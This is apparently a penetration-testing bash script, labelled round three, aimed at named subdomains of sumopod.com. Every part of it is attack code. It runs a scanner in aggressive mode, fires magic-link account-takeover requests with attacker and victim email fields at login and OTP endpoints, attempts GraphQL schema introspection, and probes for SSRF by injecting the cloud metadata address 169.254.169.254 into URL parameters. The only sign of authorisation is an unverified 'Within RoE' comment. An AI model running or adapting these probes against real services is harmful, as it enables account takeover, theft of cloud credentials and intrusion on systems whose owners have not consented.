#!/bin/bash
# Round-3: hunt other surfaces (api-pay patched, find new). Within RoE.
OUT=/tmp/sumopod_r3
mkdir -p $OUT
export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin:$HOME/.cargo/bin

# Live hosts from round-1 recon
HOSTS=$(grep -E "sumopod.com" /tmp/sumopod_eng/scope_hosts.txt | grep -vE "api-pay.sumopod.com$|api-pay-sandbox" | head -40)

echo "=== [A] KOBRA crazy on interesting live hosts ==="
for h in $(echo "$HOSTS"); do
  # only https
  case "$h" in
    https://*) : ;;
    *) h="https://$h" ;;
  esac
  echo ">> $h" >> $OUT/kobra.txt
  timeout 60 kobra -t "$h" -m crazy -o "$OUT/scan_$(echo $h | tr '/:' '__').json" 2>/dev/null >> $OUT/kobra.txt
done

echo "=== [B] Magic-link ATO pre-auth (research r1): tamper email/token in /send-code /login ==="
for ep in "/send-code" "/api/send-code" "/login" "/api/login" "/auth/login" "/otp/send" "/api/otp"; do
  for host in "https://sumopod.com" "https://api-gate-v2.sumopod.com"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$host$ep" -H "Content-Type: application/json" -d '{"email":"attacker@evil.com","victim":"victim@sumopod.com"}')
    echo "$host$ep -> $code" >> $OUT/ato.txt
  done
done

echo "=== [C] GraphQL introspection on ai/api-gate/chat/console ==="
for h in "https://ai.sumopod.com" "https://api-gate-v2.sumopod.com" "https://chat.sumopod.com" "https://console-app.sumopod.com" "https://n8x.sumopod.com"; do
  for hdr in "" "X-Introspection: enabled"; do
    r=$(curl -s --max-time 10 -X POST "$h/graphql" -H "Content-Type: application/json" ${hdr:+-H "$hdr"} -d '{"query":"{__schema{types{name}}}"}')
    echo "$h ${hdr:-no-hdr} -> $(echo $r | head -c 120)" >> $OUT/graphql.txt
  done
done

echo "=== [D] Cloud SSRF probe (passive: check error leakage, no real IMDS hit) ==="
for h in "https://api-gate-v2.sumopod.com" "https://api-proxy-tencent-service.sumopod.com" "https://r2-cdn.sumopod.com"; do
  for p in "url" "redirect" "proxy" "file" "target"; do
    r=$(curl -s --max-time 10 "$h/?$p=http://169.254.169.254/latest/meta-data/" )
    echo "$h?$p -> $(echo $r | head -c 80)" >> $OUT/ssrf.txt
  done
done

echo "R3_DONE"
